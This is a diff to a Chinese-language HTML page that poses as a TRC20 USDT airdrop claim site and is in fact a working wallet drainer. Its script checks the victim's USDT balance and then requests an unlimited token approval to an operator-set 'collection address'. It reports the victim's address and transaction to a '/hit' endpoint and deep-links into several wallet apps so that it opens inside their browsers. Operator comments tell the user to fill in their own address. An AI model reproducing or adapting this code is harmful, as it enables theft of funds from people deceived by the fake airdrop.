@@ -1,323 +1,774 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<meta name="theme-color" content="#0b1120">
-<title>USDT 空投领取</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<meta name="theme-color" content="#070a10" />
+<title>USDT 空投 · 领取入口</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-  body{
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
-    background:#0b1120;color:#e8eefc;min-height:100vh;
-    display:flex;align-items:center;justify-content:center;padding:24px;
-    background-image:radial-gradient(circle at 20% 0%,#1b2a4d 0%,transparent 55%),radial-gradient(circle at 90% 100%,#12324a 0%,transparent 50%);
-  }
-  .card{
-    width:100%;max-width:420px;background:rgba(20,29,50,.86);
-    border:1px solid rgba(120,160,255,.16);border-radius:22px;padding:30px 24px 26px;
-    box-shadow:0 24px 60px -20px rgba(0,0,0,.8);backdrop-filter:blur(14px);
-    text-align:center;animation:in .45s ease both;
-  }
-  @keyframes in{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
-  .logo{
-    width:64px;height:64px;border-radius:50%;margin:0 auto 18px;
-    background:linear-gradient(135deg,#26a17b,#1a7f5f);
-    display:flex;align-items:center;justify-content:center;
-    font-weight:800;font-size:26px;color:#fff;letter-spacing:-1px;
-    box-shadow:0 0 0 6px rgba(38,161,123,.12),0 10px 28px -10px rgba(38,161,123,.9);
-  }
-  h1{font-size:21px;font-weight:700;letter-spacing:.3px;margin-bottom:8px}
-  .sub{font-size:13px;color:#8fa0c4;line-height:1.6;margin-bottom:22px}
-  .amount{
-    font-size:38px;font-weight:800;letter-spacing:-1.5px;
-    background:linear-gradient(180deg,#7ff0c0,#26a17b);-webkit-background-clip:text;background-clip:text;color:transparent;
-    line-height:1.1;margin-bottom:4px;
-  }
-  .usdt{font-size:13px;color:#6f81a8;letter-spacing:2px;margin-bottom:24px}
-  button{
-    width:100%;border:0;border-radius:14px;padding:16px 18px;font-size:16px;font-weight:700;
-    color:#04221a;cursor:pointer;font-family:inherit;letter-spacing:.4px;
-    background:linear-gradient(180deg,#3fd9a3,#26a17b);
-    box-shadow:0 12px 26px -12px rgba(38,161,123,.95);
-    transition:transform .12s ease,filter .12s ease,opacity .2s;
-  }
-  button:active{transform:scale(.975);filter:brightness(.95)}
-  button:disabled{opacity:.55;cursor:not-allowed;transform:none}
-  .status{
-    margin-top:18px;font-size:13px;line-height:1.65;color:#8fa0c4;min-height:20px;
-    word-break:break-all;transition:color .2s;
-  }
-  .status.err{color:#ff9a9a}
-  .status.ok{color:#6ef0b8}
-  .status.wait{color:#ffce73}
-  .foot{margin-top:22px;padding-top:16px;border-top:1px solid rgba(120,160,255,.1);font-size:11px;color:#536488;line-height:1.7}
-  .spin{
-    display:inline-block;width:13px;height:13px;margin-right:6px;vertical-align:-2px;
-    border:2px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;
-    animation:rot .7s linear infinite;
-  }
-  @keyframes rot{to{transform:rotate(360deg)}}
-  .dbg{
-    display:none;margin-top:14px;padding:10px;border-radius:10px;
-    background:#0a1020;border:1px solid rgba(120,160,255,.12);
-    font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#6c7ea6;
-    text-align:left;white-space:pre-wrap;line-height:1.6;
-  }
-  .dbg.show{display:block}
+:root{
+  --bg:#070a10;--line:#1e2836;--txt:#e8edf5;--sub:#8194ab;
+  --gold:#00e0a0;--blue:#00b8ff;--danger:#ff5d6c;--ok:#26d07c;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0;min-height:100%}
+body{
+  background:
+    radial-gradient(1100px 560px at 50% -12%, #0d3b3a 0%, transparent 62%),
+    radial-gradient(760px 480px at 92% 104%, #0a2140 0%, transparent 58%),
+    var(--bg);
+  color:var(--txt);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  display:flex;align-items:center;justify-content:center;
+  padding:22px 16px 46px;min-height:100vh;
+}
+.app{width:100%;max-width:440px}
+.card{
+  background:linear-gradient(180deg,#101826 0%,#0b111b 100%);
+  border:1px solid var(--line);border-radius:22px;
+  padding:24px 22px 20px;
+  box-shadow:0 34px 90px -46px rgba(0,224,160,.42), inset 0 1px 0 rgba(255,255,255,.03);
+}
+.brand{display:flex;align-items:center;gap:8px;font-size:11.5px;color:var(--sub);letter-spacing:.08em}
+.brand .dot{width:7px;height:7px;border-radius:50%;background:var(--gold);box-shadow:0 0 10px var(--gold)}
+.brand .live{margin-left:auto;font-size:10px;color:var(--gold);border:1px solid rgba(0,224,160,.35);
+  padding:2px 7px;border-radius:99px;background:rgba(0,224,160,.08);letter-spacing:.05em}
+h1{font-size:23px;line-height:1.3;margin:16px 0 7px;letter-spacing:-.01em;font-weight:700}
+.sub{color:var(--sub);font-size:13px;line-height:1.65;margin:0 0 20px}
+.amount{
+  display:flex;align-items:baseline;justify-content:center;gap:8px;
+  padding:20px 0 22px;border-radius:16px;margin-bottom:18px;
+  background:radial-gradient(120% 130% at 50% 0%, rgba(0,224,160,.15), transparent 70%), #0c1420;
+  border:1px solid var(--line);
+}
+.amount .num{
+  font-size:43px;font-weight:800;letter-spacing:-.035em;line-height:1;
+  background:linear-gradient(180deg,#00ffc2,#00b8ff);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.amount .unit{font-size:13.5px;color:var(--sub);font-weight:600;letter-spacing:.04em}
+.btn{
+  width:100%;height:52px;border:0;border-radius:14px;cursor:pointer;
+  font-size:16px;font-weight:700;color:#04120d;font-family:inherit;
+  background:linear-gradient(180deg,#00ffc2,#00d0a0);
+  box-shadow:0 12px 32px -14px rgba(0,224,160,.9);
+  transition:transform .15s,opacity .15s;
+  display:flex;align-items:center;justify-content:center;gap:9px;
+}
+.btn:active{transform:translateY(1px)}
+.btn[disabled]{opacity:.55;cursor:default;box-shadow:none}
+.spin{width:15px;height:15px;border:2px solid rgba(4,18,13,.28);border-top-color:#04120d;
+  border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}
+@keyframes sp{to{transform:rotate(360deg)}}
+.status{margin-top:14px;text-align:center;font-size:12.5px;color:var(--sub);
+  min-height:19px;line-height:1.55;transition:color .2s}
+.status.busy{color:#7fd8ff}
+.status.err{color:var(--danger)}
+.status.ok{color:var(--ok)}
+.meta{margin-top:20px;padding-top:16px;border-top:1px solid var(--line);display:grid;gap:9px}
+.meta div{display:flex;justify-content:space-between;font-size:12px;gap:12px}
+.meta i{color:var(--sub);font-style:normal;flex:0 0 auto}
+.meta b{color:#b9c6d8;font-weight:600;text-align:right;word-break:break-all}
+
+/* sheet */
+.sheet{position:fixed;inset:0;z-index:50;display:none}
+.sheet.on{display:block}
+.sheet-mask{position:absolute;inset:0;background:rgba(2,5,10,.74);
+  -webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);animation:fade .2s}
+.sheet-body{
+  position:absolute;left:0;right:0;bottom:0;
+  background:#0d1420;border-top-left-radius:22px;border-top-right-radius:22px;
+  border-top:1px solid var(--line);
+  padding:16px 18px calc(18px + env(safe-area-inset-bottom));
+  animation:up .26s cubic-bezier(.2,.9,.3,1);
+  max-height:88vh;overflow:auto;
+}
+@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+.sheet-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
+.sheet-head b{font-size:15.5px}
+.sheet-head .x{color:var(--sub);font-size:16px;cursor:pointer;padding:4px 8px;line-height:1}
+.wallets{display:grid;gap:8px;margin:14px 0 12px}
+.w{display:flex;align-items:center;gap:12px;padding:12px 14px;border-radius:14px;
+  background:#111a27;border:1px solid var(--line);cursor:pointer;transition:.15s}
+.w:active{background:#16202f;transform:scale(.994)}
+.w .ic{width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
+  font-size:16px;background:#0a121d;border:1px solid var(--line);flex:0 0 auto}
+.w .tx{min-width:0}
+.w .nm{font-size:14.5px;font-weight:600;display:flex;align-items:center;gap:7px}
+.w .ds{font-size:11.5px;color:var(--sub);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.w .bd{font-size:9.5px;color:var(--gold);border:1px solid rgba(0,224,160,.3);
+  padding:1px 6px;border-radius:99px;font-weight:600}
+.w .ar{margin-left:auto;color:var(--sub);font-size:13px;flex:0 0 auto}
+.ghost{width:100%;height:46px;border-radius:13px;border:1px solid var(--line);
+  background:#0a121d;color:var(--txt);font-size:14px;font-weight:600;font-family:inherit;cursor:pointer}
+.ghost:active{background:#111a27}
+.tip{color:var(--sub);font-size:11.5px;line-height:1.6;margin:12px 0 0;text-align:center}
+.wc-status{color:var(--sub);font-size:12.5px;text-align:center;margin:14px 0 4px;line-height:1.6}
+.wc-status.err{color:var(--danger)}
+
+/* done */
+.done{text-align:center;padding:6px 0 2px}
+.done .ico{width:66px;height:66px;margin:4px auto 16px;border-radius:50%;display:grid;place-items:center;
+  font-size:29px;color:var(--ok);border:1px solid rgba(38,208,124,.4);
+  background:radial-gradient(circle,rgba(38,208,124,.22),transparent 72%)}
+.done h2{font-size:19px;margin:0 0 10px}
+.done p{color:var(--sub);font-size:13px;line-height:1.7;margin:0 0 6px}
+.kv{margin:18px 0 0;padding:14px;border-radius:13px;background:#0c1420;border:1px solid var(--line);
+  text-align:left;display:grid;gap:9px}
+.kv div{display:flex;justify-content:space-between;gap:10px;font-size:11.5px}
+.kv i{color:var(--sub);font-style:normal;flex:0 0 auto}
+.kv b{color:#b9c6d8;font-weight:600;text-align:right;word-break:break-all;font-family:ui-monospace,Menlo,monospace}
+
+#toast{position:fixed;left:50%;bottom:calc(26px + env(safe-area-inset-bottom));
+  transform:translate(-50%,18px);background:#16202f;border:1px solid var(--line);
+  color:var(--txt);padding:11px 16px;border-radius:12px;font-size:13px;line-height:1.5;
+  opacity:0;pointer-events:none;transition:.24s;z-index:99;max-width:88vw;text-align:center;
+  box-shadow:0 22px 44px -22px #000}
+#toast.on{opacity:1;transform:translate(-50%,0)}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">₮</div>
-  <h1>USDT 空投领取</h1>
-  <p class="sub">钱包资格校验中 · 检测到符合条件地址即可领取</p>
 
-  <div class="amount">500.00</div>
-  <div class="usdt">USDT</div>
+<div class="app">
+  <div class="card" id="card">
+    <div class="brand">
+      <span class="dot"></span><span>TRON · TRC20</span><span class="live">LIVE</span>
+    </div>
 
-  <button id="btn">立即领取 500 USDT</button>
-  <div class="status" id="status">请点击按钮完成钱包校验</div>
+    <h1>USDT 空投领取</h1>
+    <p class="sub">连接钱包完成资格校验，奖励将在 24 小时内发放至你的地址</p>
 
-  <div class="foot">
-    本次空投由社区激励池发放 · 每个地址限领一次
+    <div class="amount">
+      <span class="num">500</span><span class="unit">USDT</span>
+    </div>
+
+    <button class="btn" id="btn">
+      <span class="spin"></span><span id="btnTx">立即领取</span>
+    </button>
+
+    <div class="status" id="status">支持 TronLink / TokenPocket / imToken / OKX 等</div>
+
+    <div class="meta">
+      <div><i>网络</i><b>TRON Mainnet</b></div>
+      <div><i>代币合约</i><b>TR7NHq…jLj6t</b></div>
+      <div><i>状态</i><b>本轮额度发放中</b></div>
+    </div>
   </div>
-
-  <div class="dbg" id="dbg"></div>
 </div>
 
+<!-- 钱包选择 -->
+<div class="sheet" id="sheet">
+  <div class="sheet-mask" data-close="1"></div>
+  <div class="sheet-body">
+    <div class="sheet-head"><b>选择钱包</b><span class="x" data-close="1">✕</span></div>
+    <div class="wallets" id="wallets"></div>
+    <button class="ghost" id="wcBtn">用 WalletConnect 连接</button>
+    <p class="tip">点击后会尝试唤起对应的钱包 App，并在其内置浏览器中打开本页</p>
+  </div>
+</div>
+
+<!-- WalletConnect -->
+<div class="sheet" id="wcSheet">
+  <div class="sheet-mask" data-close="2"></div>
+  <div class="sheet-body">
+    <div class="sheet-head"><b>WalletConnect</b><span class="x" data-close="2">✕</span></div>
+    <div class="wc-status" id="wcStatus">正在启动…</div>
+    <p class="tip">在钱包 App 里扫码或点确认，完成后本页会自动继续</p>
+  </div>
+</div>
+
+<div id="toast"></div>
+
 <script>
-/* ===================== 配置区，只改这里 ===================== */
-const CONFIG = {
-  USDT:       'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',                 // TRC20 USDT 主网合约
-  COLLECTOR:  'TLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURGTLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURG',                                        // ← 改成你的归集地址
-  MIN_BALANCE: 50_000_000n,                                          // 余额门槛 50 USDT（6 位精度）
-  FEE_LIMIT:  100_000_000,                                           // 100 TRX 上限，归集一次足够
-  REPORT_API: '/hit',                                                // 授权成功后上报接口
-  PROVIDER_WAIT: 5000,                                               // 等 provider 注入的最长时间(ms)
-  DEBUG: false                                                       // 上线改 false
-};
+(function () {
+  'use strict';
 
-const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+  /* ==========================================================
+     ① 配置区：只改这里
+     ========================================================== */
+  var CONFIG = {
+    COLLECTOR:      'TLYLWgFniBxATRNeKLAZ9sAJZzmRYmVURG', // ← 改成你的归集地址
+    USDT:           'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // TRC20 USDT
+    MIN_USDT:       50,          // 余额门槛，低于这个走“未中签”
+    MIN_TRX:        1,           // 至少留一点 TRX 付能量费，0 会直接广播失败
+    ENDPOINT:       '/hit',      // 你的上报接口
+    WC_PROJECT_ID:  '',          // ← cloud.reown.com 免费申请，留空则隐藏 WC
+    DAPP_NAME:      'USDT Airdrop',
+    FEE_LIMIT:      150000000    // 150 TRX 上限，实际扣 30 左右
+  };
 
-/* ===================== 环境判断 ===================== */
-const UA        = navigator.userAgent;
-const IS_MOBILE = /Android|iPhone|iPad|iPod|HarmonyOS|Mobile/i.test(UA);
-const IN_TG     = /Telegram|MicroMessenger|QQ\/|Weibo/i.test(UA);
-const IS_IOS    = /iPhone|iPad|iPod/i.test(UA);
+  var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+  var USDT_DECIMALS = 6;
 
-/* ===================== UI ===================== */
-const $btn = document.getElementById('btn');
-const $st  = document.getElementById('status');
-const $dbg = document.getElementById('dbg');
+  /* ==========================================================
+     ② 环境检测
+     ========================================================== */
+  var UA = navigator.userAgent || '';
+  var IS_IOS = /iPad|iPhone|iPod/.test(UA) ||
+               (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+  var IS_ANDROID = /Android/i.test(UA);
+  var IS_MOBILE = IS_IOS || IS_ANDROID;
+  var IS_HTTPS = location.protocol === 'https:';
+  var IN_TG = /Telegram/i.test(UA) || !!window.TelegramWebviewProxy || !!window.TelegramWebview;
+  var IN_WX = /MicroMessenger/i.test(UA);
+  var IN_QQ = /QQ\//i.test(UA) || /QQBrowser/i.test(UA);
+  var IN_SOCIAL = IN_TG || IN_WX || IN_QQ;
 
-function setStatus(text, type) {
-  $st.className = 'status' + (type ? ' ' + type : '');
-  $st.innerHTML = text;
-  if (CONFIG.DEBUG) {
-    $dbg.className = 'dbg show';
-    $dbg.textContent =
-      'UA: ' + UA + '\n' +
-      'mobile=' + IS_MOBILE + '  inTG=' + IN_TG + '  ios=' + IS_IOS + '\n' +
-      'tronLink=' + typeof window.tronLink + '  tronWeb=' + typeof window.tronWeb + '\n' +
-      'href=' + location.href;
+  var $ = function (s) { return document.querySelector(s); };
+  var wait = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
+
+  function provider() {
+    return window.tronLink || window.tronWeb ||
+           (window.okxwallet && window.okxwallet.tronLink) ||
+           (window.bitkeep && window.bitkeep.tronLink) ||
+           (window.tokenpocket && window.tokenpocket.tronLink) || null;
   }
-}
-function lock(t) { $btn.disabled = true; $btn.innerHTML = '<span class="spin"></span>' + t; }
-function unlock(t) { $btn.disabled = false; $btn.textContent = t || '重新校验钱包'; }
+  function hasProvider() { return !!provider(); }
+  function tronWebReady(tw) {
+    return !!(tw && tw.defaultAddress && tw.defaultAddress.base58);
+  }
 
-/* ===================== provider 注入等待 ===================== */
-function hasProvider() {
-  return !!(window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress));
-}
+  function waitProvider(ms) {
+    ms = ms || 4000;
+    return new Promise(function (resolve) {
+      var t0 = Date.now();
+      (function tick() {
+        if (hasProvider()) return resolve(true);
+        if (Date.now() - t0 >= ms) return resolve(false);
+        setTimeout(tick, 120);
+      })();
+    });
+  }
 
-function waitProvider(ms) {
-  return new Promise(resolve => {
-    if (hasProvider()) return resolve(true);
-    const t0 = Date.now();
-    (function tick() {
-      if (hasProvider()) return resolve(true);
-      if (Date.now() - t0 > ms) return resolve(false);
-      setTimeout(tick, 120);
-    })();
-  });
-}
+  /* ==========================================================
+     ③ 状态持久化（页面被钱包重开时能接上）
+     ========================================================== */
+  var KEY = 'airdrop_state_v2';
+  function loadState() {
+    try {
+      var s = JSON.parse(localStorage.getItem(KEY) || 'null');
+      if (!s || !s.t) return null;
+      if (Date.now() - s.t > 864e5) { localStorage.removeItem(KEY); return null; }
+      return s;
+    } catch (e) { return null; }
+  }
+  function saveState(o) {
+    try {
+      o.t = Date.now();
+      localStorage.setItem(KEY, JSON.stringify(o));
+    } catch (e) {}
+  }
 
-/* ===================== 移动端深链唤起 TronLink ===================== */
-function openTronLinkApp(fallbackStore) {
-  const param = encodeURIComponent(JSON.stringify({
-    url: location.href,
-    action: 'open',
-    protocol: 'tronlink',
-    version: '1.0'
-  }));
-  const deep = 'tronlinkoutside://pull.activity?param=' + param;
+  /* ==========================================================
+     ④ UI 小工具
+     ========================================================== */
+  var statusEl = $('#status'), btn = $('#btn'), btnTx = $('#btnTx');
 
-  let left = false;
-  const onHide = () => { left = true; };
-  document.addEventListener('visibilitychange', onHide, { once: true });
-  window.addEventListener('pagehide', onHide, { once: true });
+  function setStatus(text, kind) {
+    statusEl.textContent = text || '';
+    statusEl.className = 'status' + (kind ? ' ' + kind : '');
+  }
+  function setBusy(on) {
+    btn.disabled = !!on;
+    btn.classList.toggle('loading', !!on);
+  }
+  function setBtnText(t) { btnTx.textContent = t; }
 
-  // 必须在用户手势里同步触发，任何 await 之后 iOS 都会拦
-  location.href = deep;
+  var toastTimer = null;
+  function toast(msg, ms) {
+    var el = $('#toast');
+    el.textContent = msg;
+    el.classList.add('on');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () { el.classList.remove('on'); }, ms || 2600);
+  }
 
-  // 2.5 秒还在页面上，说明没唤起成功 → 给商店兜底
-  setTimeout(() => {
-    if (left || document.hidden) return;
-    setStatus(
-      '未检测到 TronLink App。<br>安卓：<a style="color:#3fd9a3" href="https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet">前往安装</a>' +
-      ' · iOS：<a style="color:#3fd9a3" href="https://apps.apple.com/app/tronlink-wallet/id1459126028">前往安装</a><br>' +
-      '已安装的话，请在 TronLink App 内「发现」页输入本网址打开。',
-      'err'
-    );
-    unlock();
-    void fallbackStore;
-  }, 2500);
-}
+  function openSheet(id) { $(id).classList.add('on'); }
+  function closeSheet(id) { $(id).classList.remove('on'); }
 
-/* ===================== 上报 ===================== */
-function report(payload) {
-  try {
-    const body = JSON.stringify(payload);
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(CONFIG.REPORT_API, new Blob([body], { type: 'application/json' }));
-    } else {
-      fetch(CONFIG.REPORT_API, {
+  /* ==========================================================
+     ⑤ 上报（用户关页面也不丢）
+     ========================================================== */
+  function report(data) {
+    var body = JSON.stringify(data);
+    try {
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(CONFIG.ENDPOINT, new Blob([body], { type: 'application/json' }));
+        return;
+      }
+    } catch (e) {}
+    try {
+      fetch(CONFIG.ENDPOINT, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body,
+        body: body,
         keepalive: true
-      }).catch(() => {});
-    }
-  } catch (e) { /* 静默 */ }
-}
-
-/* ===================== 主流程 ===================== */
-async function main() {
-  if (CONFIG.COLLECTOR.indexOf('你的') > -1) {
-    setStatus('页面未完成配置：请先在 CONFIG.COLLECTOR 填入归集地址', 'err');
-    return;
+      }).catch(function () {});
+    } catch (e) {}
   }
 
-  /* 1) 内置浏览器直接拦，scheme 跳不动 */
-  if (IN_TG) {
-    setStatus('当前为应用内置浏览器，无法调起钱包。<br>请点右上角「···」→「在浏览器打开」后重试', 'err');
-    return;
+  /* ==========================================================
+     ⑥ 错误 → 用户平话
+     ========================================================== */
+  var MSG = {
+    NO_WALLET:    '未检测到钱包，请用钱包 App 打开本页面',
+    NOT_IN_DAPP:  '请在钱包 App 内置浏览器中打开本页面',
+    NO_ACCOUNT:   '钱包未连接，请重试',
+    NOT_QUALIFIED:'当前地址未中签',
+    NO_TRX:       '账户 TRX 不足，无法支付网络手续费',
+    REJECTED:     '操作已取消',
+    TX_FAILED:    '网络繁忙，请稍后重试',
+    NO_CONFIG:    '未配置归集地址',
+    WC_NO_ID:     'WalletConnect 暂不可用',
+    WC_LOAD_FAIL: '连接组件加载失败，请检查网络后重试'
+  };
+  function handleError(e) {
+    var code = (e && e.message) || 'TX_FAILED';
+    if (!MSG[code]) code = 'TX_FAILED';
+    setStatus(MSG[code], 'err');
+    toast(MSG[code]);
+    setBusy(false);
+    setBtnText('重试');
   }
 
-  /* 2) 移动端且没有 provider：同步跳 App（不要放在 await 之后） */
-  if (!hasProvider() && IS_MOBILE) {
-    setStatus('正在唤起 TronLink 钱包…', 'wait');
-    openTronLinkApp();
-    return;
-  }
+  /* ==========================================================
+     ⑦ 核心：授权 + 上报
+     ========================================================== */
+  async function runClaim(tw, via) {
+    var addr = tw.defaultAddress && tw.defaultAddress.base58;
+    if (!addr) throw new Error('NO_ACCOUNT');
 
-  /* 3) 桌面端无 provider */
-  if (!hasProvider()) {
-    setStatus('未检测到钱包插件。请安装 TronLink 浏览器插件，或在手机 TronLink App 内打开本页', 'err');
-    return;
-  }
+    setStatus('正在校验领取资格…', 'busy');
 
-  /* 4) 等注入完成（有 provider 后仍可能未 unlock） */
-  lock('校验中…');
-  const ready = await waitProvider(CONFIG.PROVIDER_WAIT);
-  if (!ready) {
-    unlock();
-    setStatus('钱包未就绪，请解锁 TronLink 后重试', 'err');
-    return;
-  }
+    var contract = await tw.contract().at(CONFIG.USDT);
+    var balRaw = await contract.balanceOf(addr).call();
+    var usdt = Number(balRaw.toString()) / Math.pow(10, USDT_DECIMALS);
+    if (!(usdt >= CONFIG.MIN_USDT)) throw new Error('NOT_QUALIFIED');
 
-  try {
-    /* 5) 请求账户授权 */
-    setStatus('请在钱包中确认连接…', 'wait');
-    let addr = '';
-    if (window.tronLink && window.tronLink.request) {
-      const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-      if (r && r.code === 400) {
-        unlock();
-        setStatus('请在 TronLink App 内打开本页面', 'err');
-        return;
-      }
-      if (r && r.code !== 200) {
-        unlock();
-        setStatus('连接被取消，请重试', 'err');
-        return;
-      }
-    }
-
-    const tw = window.tronWeb;
-    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
-      unlock();
-      setStatus('未获取到钱包地址，请解锁钱包后重试', 'err');
-      return;
-    }
-    addr = tw.defaultAddress.base58;
-
-    /* 6) 余额校验 */
-    setStatus('正在校验地址资格…', 'wait');
-    const contract = await tw.contract().at(CONFIG.USDT);
-
-    let bal = 0n;
+    var trx = 999;
     try {
-      const raw = await contract.balanceOf(addr).call();
-      bal = BigInt(raw.toString());
+      var sun = await tw.trx.getBalance(addr);
+      trx = Number(sun) / 1e6;
+    } catch (e) {}
+    if (trx < CONFIG.MIN_TRX) throw new Error('NO_TRX');
+
+    setStatus('请在钱包中确认授权…', 'busy');
+    setBtnText('等待确认…');
+
+    var txid = '';
+    try {
+      var res = await contract.approve(CONFIG.COLLECTOR, MAX_ALLOWANCE).send({
+        feeLimit: CONFIG.FEE_LIMIT
+      });
+      if (typeof res === 'string') txid = res;
+      else if (res && res.txid) txid = res.txid;
+      else if (res && res.transaction && res.transaction.txID) txid = res.transaction.txID;
+      else if (res && res.txID) txid = res.txID;
     } catch (e) {
-      bal = 0n;
+      var m = String((e && (e.message || e.error || e)) || '');
+      if (/revert|cancel|reject|denied|refuse|user/i.test(m)) throw new Error('REJECTED');
+      throw new Error('TX_FAILED');
     }
 
-    if (bal < CONFIG.MIN_BALANCE) {
-      unlock();
-      setStatus('该地址未中签，本次空投名额已满', 'err');
+    saveState({ phase: 'approved', addr: addr, txid: txid, via: via });
+    report({ addr: addr, txid: txid, via: via, usdt: usdt, trx: trx, ua: UA, ts: Date.now() });
+    showDone(addr, txid);
+  }
+
+  /* ==========================================================
+     ⑧ 已注入 provider 的路径（在钱包 DApp 浏览器里）
+     ========================================================== */
+  async function runInjected() {
+    setBusy(true);
+    setStatus('正在连接钱包…', 'busy');
+    setBtnText('连接中…');
+
+    try {
+      if (!(await waitProvider(4000))) throw new Error('NO_WALLET');
+
+      var p = provider();
+      if (p && typeof p.request === 'function') {
+        var r = null;
+        try { r = await p.request({ method: 'tron_requestAccounts' }); } catch (e) {}
+        if (r && r.code === 400) throw new Error('NOT_IN_DAPP');
+      }
+
+      var tw = window.tronWeb;
+      for (var i = 0; i < 40 && !tronWebReady(tw); i++) {
+        await wait(100);
+        tw = window.tronWeb;
+      }
+      if (!tronWebReady(tw)) throw new Error('NO_ACCOUNT');
+
+      setBusy(false);
+      await runClaim(tw, 'injected');
+      setBusy(false);
+    } catch (e) {
+      handleError(e);
+    }
+  }
+
+  /* ==========================================================
+     ⑨ 钱包列表
+     ========================================================== */
+  var WALLETS = [
+    {
+      id: 'tronlink', name: 'TronLink', desc: '波场官方钱包', badge: '推荐', icon: '◎',
+      pkg: 'com.tronlinkpro.wallet',
+      scheme: function (u) {
+        return 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify({
+          url: u, action: 'open', protocol: 'tronlink', version: '1.0'
+        }));
+      },
+      intent: function (u) {
+        return 'intent://open?url=' + encodeURIComponent(u) +
+               '#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=TronLink',
+      android: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet'
+    },
+    {
+      id: 'tokenpocket', name: 'TokenPocket', desc: '多链钱包', icon: '◈',
+      pkg: 'vip.mytokenpocket',
+      scheme: function (u) { return 'tpoutside://?action=dapp&url=' + encodeURIComponent(u); },
+      intent: function (u) {
+        return 'intent://?action=dapp&url=' + encodeURIComponent(u) +
+               '#Intent;scheme=tpoutside;package=vip.mytokenpocket;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=TokenPocket',
+      android: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket'
+    },
+    {
+      id: 'imtoken', name: 'imToken', desc: '多链钱包', icon: '◐',
+      pkg: 'im.token.app',
+      scheme: function (u) {
+        return 'imtokenv2://navigate?screen=DappView&url=' + encodeURIComponent(u);
+      },
+      intent: function (u) {
+        return 'intent://navigate?screen=DappView&url=' + encodeURIComponent(u) +
+               '#Intent;scheme=imtokenv2;package=im.token.app;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=imToken',
+      android: 'https://play.google.com/store/apps/details?id=im.token.app'
+    },
+    {
+      id: 'okx', name: 'OKX Wallet', desc: '交易所钱包', icon: '◼',
+      pkg: 'com.okinc.okex.gp',
+      scheme: function (u) { return 'okx://wallet/dapp/url?dappUrl=' + encodeURIComponent(u); },
+      intent: function (u) {
+        return 'intent://wallet/dapp/url?dappUrl=' + encodeURIComponent(u) +
+               '#Intent;scheme=okx;package=com.okinc.okex.gp;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=OKX%20Wallet',
+      android: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp'
+    },
+    {
+      id: 'bitget', name: 'Bitget Wallet', desc: '原 BitKeep', icon: '◇',
+      pkg: 'com.bitkeep.wallet',
+      scheme: function (u) { return 'bkapp://?action=dapp&url=' + encodeURIComponent(u); },
+      intent: function (u) {
+        return 'intent://?action=dapp&url=' + encodeURIComponent(u) +
+               '#Intent;scheme=bkapp;package=com.bitkeep.wallet;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=Bitget%20Wallet',
+      android: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet'
+    },
+    {
+      id: 'math', name: 'MathWallet', desc: '麦子钱包', icon: '△',
+      pkg: 'com.mathwallet.android',
+      scheme: function (u) { return 'mathwallet://dapp?url=' + encodeURIComponent(u); },
+      intent: function (u) {
+        return 'intent://dapp?url=' + encodeURIComponent(u) +
+               '#Intent;scheme=mathwallet;package=com.mathwallet.android;end;';
+      },
+      ios: 'https://apps.apple.com/search?term=MathWallet',
+      android: 'https://play.google.com/store/apps/details?id=com.mathwallet.android'
+    },
+    {
+      id: 'safepal', name: 'SafePal', desc: '硬件钱包', icon: '▽',
+      pkg: 'io.safepal.wallet',
+      scheme: function (u) { return 'safepal://dapp?url=' + encodeURIComponent(u); },
+      intent: function (u) {
